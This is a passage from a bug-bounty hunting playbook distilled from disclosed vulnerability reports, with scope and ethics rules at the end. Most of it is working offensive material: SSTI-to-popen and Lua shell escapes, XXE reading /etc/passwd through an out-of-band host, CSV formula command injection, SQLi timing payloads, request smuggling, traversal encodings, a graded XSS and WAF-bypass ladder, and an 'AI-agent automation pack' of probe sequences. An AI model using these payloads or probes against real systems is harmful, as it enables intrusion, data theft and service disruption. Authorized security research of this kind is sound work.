## 16. Business logic, race conditions, rate limits (253 usable, avg $234)

**Root cause.** Trust in client-supplied amounts/plans/quantities/steps; non-atomic check-then-act; counters that resend/parallelism resets; filters with uncovered attributes.

**Case files.** `1029027` (Imgur): leading space in icon name (`" "` + paid name) served paid avatars free — trim/normalize gaps are logic bugs. `1047100` (Stripo): no rate limit on data-create (`projectId=` + `X-XSRF-TOKEN` replayable). `1021776` (cs.money): `POST /create-payment {"merchant":"cardpay","amount":10}` → order-ID/URL flow — amount/merchant tamper surface. `1021885`: `srcset` as logic-filter bypass (privacy control defeated by uncovered attribute). `1065493`: double-resolution DNS TOCTOU. `1019457` (curl): `getaddrinfo` race under helgrind — concurrency bugs hide in resolvers/caches. Email-verify bypass (`1040047`): invite/verify link usable from another browser — verification bound to link, not to session/requester. `244636`: `confirm_email` body email swap. `2028450`: delete-after-leave via direct API.

**Hunt checklist.** Tamper price/qty/role/plan/currency (negatives, zero, spaces, case, array-vs-scalar, K/M suffixes); coupon/referral reuse+stack+reorder (redeem→cancel→redeem) and parallel redeem (Turbo Intruder 10–20×); OTP/resend/verify matrix; workflow skipping (`/step3` directly, method swap, webhook replay with neighboring `projectId`); invite/confirm binding (link vs session vs email); normalization gaps (space/case/unicode/duplicate params).

## 17. OS command, SSTI/template, XXE, deserialization, CSV/formula injection

**OS command (163 generic at $873 + 45 OS-specific at $515 — highest web means).** Shell metachars in ping/traceroute/export/screenshot/schedule fields; time oracles (`;sleep N`, `|sleep`, `%0asleep`). `1401444` ($3,000, GitLab): wiki `mediawiki` format rendered by WikiCloth; `<lua>` extension active when `rubyluabridge` requirable; sandbox used `loadstring`+`setfenv(getfenv(2))` — the officially-documented-unsafe pattern — so `_,execute = pcall(loadstring, [[ io.popen(command) … ]]); print(execute('id'))` ran shell as the app user from a wiki page. `1327701`: `/pages/createpage-entervariables.action` `queryString=…\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027)…` (Confluence-style EL) *plus* `; ls` commit-filename write primitive in the same report — always test both read and write. `1217114`: `sleep`/`benchmark` WAF-blocked → read *how* input executes (found a `ping` path) for the alternate oracle.

**SSTI/template (333 marker hits).** `{{7*7}}`, `${7*7}`, `<%= %>`, `#{ }`, `__class__/mro()/subclasses()` in names, subjects, PDF filenames, preview URLs, webhook templates; `1057531`'s `url={{}}` is the probe shape. Escalate Jinja/Twig → `__class__.__mro__[2].__subclasses__()` → `popen`; Smarty/Twig sandboxes → tag-allowlist diffing.

**XXE (33 hits).** `105980` (ownCloud VPN login, `Content-type: application/xml`): `<!DOCTYPE a [<!ENTITY % select SYSTEM "http://wallarm.tools/ok"> %select;]>` — scanner-found (`wlrm-scnr`), server-fetched (access-log `GET /ok`) — the loop is *scan XML content-types, confirm OOB, then* `file:///etc/passwd` / `expect://` / `php://filter`. Try login/SAML/SVG/Office/XML-import endpoints; error-bait with `\u0000`.

**Deserialization (32, avg $376).** `1174185` (Telerik, CVE-2019-18935): file-upload returned an encrypted blob (`RAU_crypto.bypass`) → crypto oracle → weaponized `machineKey` → RCE via crafted `.dll` (`Sleep(10000)` DllMain PoC). `2334460` (Airflow): XCom pickle-poisoning past `enable_xcom_pickling=False`. `1119120` (Ruby): `Marshal.dump([Gem::SpecFetcher, … TarReader::Entry … @socket …])` gadget chain with null-byte segments. `1063039` (Concrete CMS): request-driven logging-handler/mode switch → code path control. Smells: `signed_id`-style blobs, `state`/`data` params, Java `readObject`, PHP `unserialize`/phar paths, Python pickle endpoints, Node `__proto__` merges (§24).

**CSV/formula injection (the fix-bypass trilogy: `72785` → `111192` → `118582`).** `111192` (HackerOne itself): prior fix stripped leading `=+-@`; bypass = leading newline `%0A-2+3+cmd|' /C calc'!D2` in the report *title* — exported CSV cell went live on open. `118582`: bypassed *that* mitigation in turn. Lesson: fixes that strip a prefix-set without stripping whitespace/control chars (`\n`, `\r`, `\t`, `,`, `;`, `|`) lose; test every cell entry-point (titles, names, addresses) *and* every export (CSV, XLS, SYLK) — payload must start with `=+-@` *after* the app's own normalization.

## 18. Path traversal, file read, file upload (185 usable, avg $600)

**Traversal.** `1004007`: `..;` past Tomcat guards. `1394916`: Apache 2.4.49 path-confusion (CVE-shaped — version-scan + `/.%%32%65/`-family). `1408692` (Nextcloud Android): upload-path check `startsWith("/data/data")` beaten by `/data/user/0/…` alias. `1070247` (Phabricator): `git log … --output=/tmp/qqq` + attacker-influenced ref → arbitrary *write* (traversal that lands a write beats a read). `1888808`: WAF blocked `/etc/passwd` but allowed `hosts` — different-file fallbacks + encoding ladder (`..;/`, `....//`, `%2e%2e/`, `%252e`, `..%c0%af`, absolute paths, null byte, `file:` scheme).

**Upload.** Serve-triple decides impact: `Content-Type` + `Content-Disposition` + CSP. SVG polyglots (`100565`), double extensions (`.php5/.phtml/.phar`), MIME spoof (`image/svg+xml`), `filename` XSS (`1010466`), `Content-Type: image/jpg` with body `true` smuggling past validators (`1040786`'s mirror upload). If forced-download, try admin preview, `<img>`/`<embed>` inclusion, traversal-to-reach, and every *other* consumer of the file (thumbnails, PDF converters, AV unpackers).

## 19. JWT, OAuth, SSO, session-token logic

**Service-token/JWT chains.** `1040786` ($10,000 — full walkthrough in §11): internal upload JWT echoed to the caller; internal headers (`Geo-GL-Id`) trusted from outside; two URL parsers disagreeing. Lessons: harvest tokens from *any* authenticated response (upload echoes, debug endpoints, error pages); replay internal-only headers from the outside; brute-force incremental key IDs; hunt parser-A/parser-B gaps at every proxy boundary. Generic JWT battery: `alg:none`, `kid` traversal/SQLi, `jku`/`x5u` to attacker, weak-secret brute, role-claim edit, cross-service `iss`/`aud` confusion.

**OAuth/SSO account takeover.** `108113` + `3723458` (validation→use gaps, §14). `1212374` (Reddit): OAuth-login with the same Gmail silently *merged into / took over* the existing email account — email-only ATO; fix is verified-linking, never silent merge. `101977`: foreign Facebook-app `access_token` accepted at Imgur's token endpoint — cross-app confusion. `1439552`: `state` bypass + unscoped Pages cookie (§11). `1018489`: injected `/accounts/{victim}/external-login/1` link bound attacker's IdP to victim flow. Battery: `redirect_uri` strictness (exact-match? fragment/port/case/IDN?), `state` presence+binding+single-use, `code` leakage (referrer/logs/redirect), silent-merge test (register email → OAuth same email → whose session?), cross-app token replay, `response_mode`/`grant` downgrades.

## 20. Cache poisoning/deception, smuggling, CRLF/header injection, clickjacking

**Cache (402 hits).** `1760213` (stored-XSS-via-`hav`-cookie + `</sc"ript>` WAF rejoin); `1025575` (Fastify + CDN/cache combo); `1010858` (Acronis cache-poisoning writeup). Battery: unkeyed inputs (`Host`, `X-Forwarded-Host/Port/Proto`, `X-Original-URL`, `utm_*`, `_method`, cookies) → reflection → victim-cache-hit; deception (`/account.css`, `/profile.json`, path-confusion) for destructive cache-store; `X-Cache`/`Age`/`CF-Cache-Status` as oracles.

**Smuggling (47, avg $585).** `1002188` (Node.js, CVE-2020-8287): duplicate `Transfer-Encoding` headers — Node honored the first, proxies the other → TE-TE desync past haproxy's `/flag` ACL with smuggled `GET /flag`. `1063493` (Acronis sandbox): `Transfer-Encoding<TAB>:<TAB>chunked` (tab, not space; base64 your probe to preserve it) + exact body-length math (93 bytes incl. smuggled `POST /sf` with Collaborator `Host`) → mass-redirect of poisoned-queue victims via `/sf`'s Host-driven redirect. Battery: CL.TE/TE.CL/TE.TE, late/duplicated `Transfer-Encoding`, tab/vertical-whitespace header names, `Content-Length` + chunked both present, `0\r\n\r\nGET` prefix, desync-to-cache and desync-to-redirect upgrades per PortSwigger's playbook (cited in-report).

**CRLF/header injection (167 header-inject hits).** `3133379`: CRLF in curl `--proxy-header` → proxy/WAF-rule bypass + `X-Forwarded-For`/`Authorization` spoof + log poison. `3479203`: CRLF in HTTP/3 QPACK conversion → downstream WAF/proxy desync, cache poison, session fixation. `1098948` (kartpay): `Host` manipulation on a redirector. `251572`: null byte in `url` broke the `Refresh` header → redirect died, injected HTML rendered (WAF had blocked the XSS; the header-break salvaged HTML injection). Battery: `%0d%0a` (+ double-encoded, +unicode) in every reflected-into-header value; `X-Forwarded-Host/For`, `X-Original-URL`/`X-Rewrite-URL` for routing/auth decisions; `Referer`/`User-Agent` where responses echo or log them.

**Clickjacking (93, $62 — chain-only).** Missing `X-Frame-Options`/CSP `frame-ancestors` + one-click sensitive action (OAuth authorize, email change, payment, API-key reveal). Always transparent-overlay PoC; always pair with another primitive.

## 21. DoS, ReDoS, resource consumption (403 usable, avg $572)

**Case files.** `1000567` (cs.money, $250): GraphQL `search(q:)` interpolated input into a server regex — error-bait `\u0000` leaked the pattern (`value (?=.*\u0000) must not contain null bytes`, then `Invalid regular expression: /(?=.*X))/`) → regex-bomb `([a-zA-Z0-9]+\s?)+$|^([a-zA-Z0-9.'\w\W]+\s?)+$\` vs baseline `"AAA"` (264ms traced) — response-time differential as the whole PoC, with `tracing.duration` as oracle. `1019457` (curl): `getaddrinfo` race under valgrind/helgrind. `1065493`: DNS double-resolution abuse for DDoS.

**Battery (throttled, math-first).** ReDoS (`(a+)+$`, nested quantifiers) on search/regex params with baseline-vs-payload timing; GraphQL deep-nesting/alias-batching/introspection floods; unbounded pagination (`first:100000`); ZIP/SVG bombs; hash-collision keys; compression-ratio abuse. Report with resource math and `tracing` deltas, never outage — and note `1005421`'s cookie `Max-Age=1000000000000000000000` class (integer/overflow-shaped parser abuse adjacent to DoS).

## 22. Supply chain — dependency confusion, registries, install scripts

**The $9k–$11.5k class.** `1043385` (LY Corp, $11,500, critical): private npm registry misconfigured → same-name higher-version attacker package on the public registry won at build time → install-script arbitrary code on build hosts. `1007014` (Uber, $9,000, critical): identical shape. Battery: enumerate private package names (sourcemaps, error stacks, `package-lock`/`yarn.lock` in repos, mobile bundles, career-page engineering blogs); check public registry for same name + higher semver; confirm scope/fallback order (`npmrc`, proxy registries, `pip --extra-index-url`, Maven/Gradle, Go proxy); *do not* publish hostile payloads — claim-squat with a benign canary + report (both paid reports here were resolved on configuration + version-pinning evidence). Adjacent: `1039504` (`wget http://…` in build scripts — HTTP-fetch in CI), `107296` (timing-oracle in update checks — supply-chain-adjacent crypto hygiene).

## 23. Client-side RCE surface — Electron, deep links, rich previews

`1016966` (Basecamp Windows Electron): downloads auto-opened when (internal-URL ∧ `text/calendar` MIME ∧ `?attachment=true`); internal-domain regexes `launchpad\.(?:dev|test)` and `3\.(?:staging\.)?basecamp\.com` unanchored → `launchpad.dev.attacker.com` passed; attacker Flask served `file.exe` as `text/calendar` → RCE on click. Battery: unanchored allow-regexes (see Law 2), MIME-allowlist vs sniffing gaps, auto-open/download-dir behaviors, deep-link handlers (`app://`, custom schemes) with parameter injection, rich-preview fetchers (SSRF-adjacent), update-channel hijack. Same regex discipline as server side — test prefix/suffix/dot-substitution on every client allow-list.

## 24. Misconfiguration and secure-design failures

**Origin-IP / edge bypass (paid repeatedly).** `1105673` (3d.cs.money), `1327443` (sifchain: Censys `ipv4?q=` → `52.88.198.160` served the app without Cloudflare), `1536299` (Censys-found origin → unfiltered payloads + direct DoS), `360825` (liberapay origin via cert correlation), `703882` (Cloudflare-fronted origin via cert transparency). Procedure: `crt.sh` + Censys/Shodan/favicons/MX/SPF/history → candidate origins → `Host`-pinned direct-IP request → compare body/headers → replay blocked payloads unfiltered. `168165` is the same law at DNS level (unprotected `secnews.wpengine.com`).

**CORS.** `1005374`: reflected `Origin` + credentials on `wp-json` → cookie-reading PoC. `1001951` (TikTok Ads): Ads-portal endpoint CORS bypass → ticket-info read on victim click (team-confirmed). Battery: evil/null/subdomain origins × credentialed/anonymous; `null` + sandbox iframes; subdomain-takeover → trusted-origin upgrade (`1018790`).

**GraphQL.** `1000567` (ReDoS + error-bait above); `1023669` (staff websocket `graphql?shop_id=` eavesdrop); `1084939`/`1091380` (alternate-query object access); `2509022` (mutations as ATO primitives). Battery: introspection/`__schema`, field-suggest enumeration, batching/alias abuse for brute-force and DoS, per-resolver auth matrix (same object, every query/mutation, three roles), subscription/webhook sinks, error-verbosity maxing.

**Prototype pollution (55 hits).** `1001218` (`@firebase/util` 0.3.2, 1.5M weekly downloads): `deepCopy`/`deepExtend` merged `JSON.parse('{"__proto__":{"polluted":"yes"}}')` onto `Object.prototype` — `({}).polluted === 'yes'` after one call; impact ladder DoS → property injection → RCE depending on app. Battery: `__proto__`/`constructor.prototype` keys in JSON merges, query parsers,deep-merge libs; confirm `({}).polluted`; escalate via polluted `transportOptions`/`shell`/`command`/`template` keys toward RCE; check client (DOM-debugger sinks) and server (config objects).

** Nok-class extras worth one line each.** `1040047`: invite/verify links usable cross-browser (bind to session). `15047`: CAPTCHA solved client-side via extension (replay the check, don't solve the puzzle). `1178562`: IMAP StartTLS-strip (CVE-2016-0772 shape — downgrade attacks live in mail/IoT). `111752`: BREACH-shape triad (compression + reflection + secret) with the canonical fix set. `134894`: anti-CSRF IP-binding via `REMOTE_ADDR` fails behind any proxy/WAF/LB (bind to session, not socket).

## 25. Payload and WAF/filter-bypass playbook

> Order of operations at every sink: plain → case-mix → whitespace/comment → encoding → alternate handler → alternate context/host. ~40% of paid XSS here needed ≥1 rung.

**XSS ladder (each rung felled a real filter).** Baseline `\"><svg onload=alert(1)>`, `\"><img src=x onerror=alert(1)>`, `javascript:alert(1)` → case-mix `0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>` + HTML- + URL-encode the whole (`1873655`) → newline-in-scheme `<a href="ja%0A%0Dvascript:alert(document.domain)">Click</a>` (`1012249`, noted in-report as the WAF bypass) → split-tag `o<br>nfocus=confirm(1337) autofocus tabindex=1` (`1251868`) and tag-soup `</li></ul>…<test/on…>` (`218226`) → exotic handlers `<h1 onauxclick=confirm(document.domain)>` (`1736432`) → quote-evasion `%u0022 id="injected` (`227486`), `%2522`-in-path (`252908`), quotes-survive `X\" onmouseover=\"alert('XSS')\"` (`3241321`) → JS-signature evasion `print`` `` ` for `alert()` (ASP.NET WAF family `3166579`+), `a=alert;a(1)` (`1184644`), `String['fromCharCode'](104,116,…)` URL-hide (`1010466`) → comment-prefix `<!-->` (`415484`) → server-rejoin `</sc\"ript>` (`1760213`), strip-rejoin `onmou<seover`/`ale<rt` (`265528`) → JS-context `-20a\")});a=alert;a(1);//` (`1184644`) → click-vectors `![…](javascript:eval(atob('…')))` (`2509022`), `javascript://%0a%0dalert(document.cookie)` (`100931`) → mXSS `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert('XSS') src>\">` (`1024734`).

**SQLi.** Quote-less `int-sleep(t)` (`1278928`); header points `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'` (`1018621`); `WAITFOR DELAY` + `@@LANGID` (MSSQL, `1034625`/`577612`); `pg_sleep`; path-segment params (`2633959`); alternate-exec oracle when `sleep` dies (`1217114`); sqlmap only after manual timing proof, with tamper for spaces/quotes.

**SSRF/redirect.** IP literals (`0.0.0.0`, `127.1`, `2130706433`, `0x7f.1`), `%c0%ae`/`%252e` dots, `whitelist%09evil`, `evil@whitelist`, overlong-schema parser bugs (`1049624`), DNS 302-follow, verb tunnels (`3231321`); redirects add `\\evil`, `%5c`, `.np`-style dot-prefix (`103772`), `#fragment` (`1047447`), non-ASCII `%ff` (`108113`), unescaped-dot domains (`3723458`), `\u0022`/double-encoding (`227486`/`252908`).

**Upload/SVG/template.** SVG-inline triple-check (type/disposition/CSP, `100565`); `filename` field (`1010466`); `{{7*7}}→__class__.__mro__` ladder; `<!ENTITY % xxe SYSTEM>` → OOB (`wallarm.tools/ok`, `105980`) → `file:///etc/passwd`/`expect://`/`php://filter`; CSV `%0A-2+3+cmd|' /C calc'!D2` (`111192`); traversal `..;/…....//…%2e%2e…%252e…/data/user/0/…` (`1004007`/`1408692`); smuggling tab-header `Transfer-Encoding<TAB>:` (`1063493`), duplicate-`Transfer-Encoding` (`1002188`).

**OTP/CSRF/cache/headers.** `000000`, resend-reset, parallel-verify, `X-Forwarded-For` rotation, message oracles; CSRF drop-token/GET-ify/`_method`/downgrade-type; cache unkeyed-input census; `%0d%0a` + `X-Original-URL`/`X-Rewrite-URL`/`X-Forwarded-Host` routing tricks.

## 26. WAF-bypass methodology that actually worked

Ranked by corpus frequency (45 WAF+bypass reports; 60 WAF contexts): **(1) Leave the WAF** — alternate origin/host/method/IP (`168165`, `1850235`, `1105673`, `1327443`, `1536299`, `360825`); origin-hunt via Censys/certs/Shodan/history, then `Host`-pinned direct requests. **(2) One encoding layer** — double-encoding, unicode, case, newline-schemes, `print`` `` `, `onauxclick` (F5 ASM fell to obfuscated-`eval` + odd handlers, `3135626`; Kona + Auditor fell together, `265528`). **(3) Feed the sanitizer its blind spot** — strip-rejoin, comment-prefix, `srcset`, quote-hiding (`265528`, `415484`, `1021885`, `1760213`). **(4) Change the parser** — curl-parser bugs (`1049624`, `3403880`), QPACK CRLF (`3479203`), verb tunnels (`3231321`), managed-ruleset gaps (AWS WAF SQLi bypass, `3591725`). **(5) Smuggle past it** — proxy-header CRLF (`3133379`), CL.TE/TE.TE desyncs. **(6) Read blocks as signals** — WAF 500/TCP-reset on `ORDER BY`/`on*=` (`218226`, `227102`) means *switch rung/host*, never `self-XSS, won't fix` (cf. under-claimed `198218`, `251572`).

## 27. AI-agent automation pack

**Sink regexes** (crawl + JS bundles + OpenAPI/GraphQL schemas): `(url|uri|link|src|href|redirect|callback|webhook|fetch|proxy|image_url|file_url)\s*[=:]`, `/api/(users|orders|invoices|tickets)/\d+|user_id|account_id|order_id`, `(redirect(_to|_url)?|next=|return_?to|continue=|callback_url|dest(ination)?=|rurl)`, `location\.(hash|search)|document\.referrer|innerHTML|outerHTML|document\.write|postMessage`, `\{\{|\$\{|<%=|__class__|mro\(\)|<!ENTITY|SYSTEM\s+["'](file|http|expect|php)`, `graphql|__schema|query\s*\{|mutation\s`, `multipart|filename\s*=|jwt|\balg\b|kid|jku|oauth|redirect_uri`, `transfer-encoding|content-length.*content-length|__proto__|169\.254\.169\.254`, `BEGIN RSA|PRIVATE KEY|\.git/config|sitemap\.xml|\.map$`.

**Probe battery per sink** (one request each, then one-encoded retry): reflected param → §25 XSS ladder rungs 1–3; numeric object → swap-ID/drop-auth/method-swap/`.json`; URL-fetcher → Collaborator → metadata → `0.0.0.0`/`127.1` → 302-follow; redirect → `//evil` → `\\evil` → `%2522` → non-ASCII → fragment; OTP → 5 fast wrong codes (`429`?) → resend → parallel → `000000`; upload → SVG-onload → `filename` XSS → double-ext → MIME-spoof; headers → `X-Forwarded-Host: evil` → `X-Original-URL: /admin` → `%0d%0aSet-Cookie: x=1`; GraphQL → introspection → suggest-enum → alias-batch → per-role matrix; regex-gated URL → Law-2 battery.

**Triage prompt.** *Given this exchange + render context, classify {XSS-R/XSS-S/DOM, SQLi, SSRF, IDOR, AuthZ, AuthN, CSRF, OpenRedirect, InfoDisc, Logic, RCE-adjacent, benign}. Require one exploitability signal. Propose ONE minimal bypass retry (encoding/handler/host/context) and a 3-step PoC. Name the closest corpus case (ID + payload shape).* Never emit undisclosed-shaped targets.

## 28. Report template (write it like the paid reports)

```
## Summary (impact-first, one breath: ATO / PII / RCE / funds)
## Weakness + Severity (CWE + why this rating; cite the transferable primitive)
## Root cause (sink → validation gap → trigger; name the sanitizer/WAF behavior)
## Steps To Reproduce (numbered, copy-paste: URLs, curl, accounts A/B, clicks)
## Payloads (fences; note which bypass rung was needed and why)
## Impact (session/PII/funds scope; GraphQL mutation / conversation-hijack if XSS)
## Supporting Material (screenshots, video, Collaborator/DNS logs, headers)
## Remediation (allow-list + encode-on-read + parameterized queries + metadata
   protection + rate limits + anchored regexes + bound tokens + no silent merges)
```

Best-received reports read like `3723458` (root-cause-first with source file + line, PoC as numbered attacker/victim steps, fix as diff) and `1016966` (restrictions listed, then each bypassed in order). Chains (`2509022`, `1439552`, `1040786`, `632017`) consistently out-earned singletons — always test one hop further.

## 29. Appendix — reproduce, limits, ethics

- **Links:** `all-links.txt` (14,759) from `data.csv` (`https://` + stored host/path).
- **Fetch:** `python3 fetch_reports_json.py --batch N --concurrent 10` (N = 0..29, 500/batch); `--all` for everything; resume-safe via `report_data/json/<id>.json`; `report_data/fetch_log.csv` + `report_data/undisclosed.txt`.
- **Final:** 12,059 readable on disk (81.7%), 2,698 `404-undisclosed-or-gone` ignored, 9,057 usable bodies; §2 stats from usable set.
- **Analyze:** `python3 analyze_corpus.py` → `analysis_summary.json`; `analyze_dump.py` → `pertype_dump.txt`; `analyze_waf.py` → `waf_dump.txt`.
- **Limits:** `Unknown` weakness (876 usable) where JSON+CSV lack labels — title-word + pattern census still applies; empty/redacted bodies ignored (may include once-paid, since-restricted reports); means un-normalized across currencies; payload contexts truncated in dumps (full text in `report_data/md/`); memory-corruption (native) counted but out of web scope; two edge files excluded (`832750` empty-body, `151117` OS file-lock on write).
- **Ethics/scope:** in-scope targets only; throttle blind/time/race/DoS probes; stop SQLi at boolean/time proof; never exfiltrate beyond PoC; honor `429`/`Retry-After` (fetcher already backs off); dependency-confusion claims use benign canaries.

*Final pass: every section above was re-checked against re-read report bodies (20 full re-reads: `3723458 108113 1043385 1040786 1024734 265528 1055823 1063493 1401444 1439552 1212374 1007014 1016966 1021885 105980 111192 1000567 1001218 1002188 2509022`) plus the 9,057-body mined census. Open any cited `report_data/md/<id>.md` to go one level deeper.*

